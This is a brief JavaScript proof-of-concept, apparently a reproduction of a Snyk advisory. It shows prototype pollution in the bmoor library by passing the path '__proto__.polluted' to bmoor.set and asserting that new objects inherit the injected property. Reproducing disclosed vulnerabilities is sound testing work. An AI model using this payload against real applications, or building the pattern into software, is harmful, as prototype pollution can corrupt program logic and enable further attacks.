//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
const bmoor = require('bmoor');
const assert = require('assert');

var obj = {}
console.log("Before : " + obj.polluted);
bmoor.set({}, "__proto__.polluted", "yes");
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");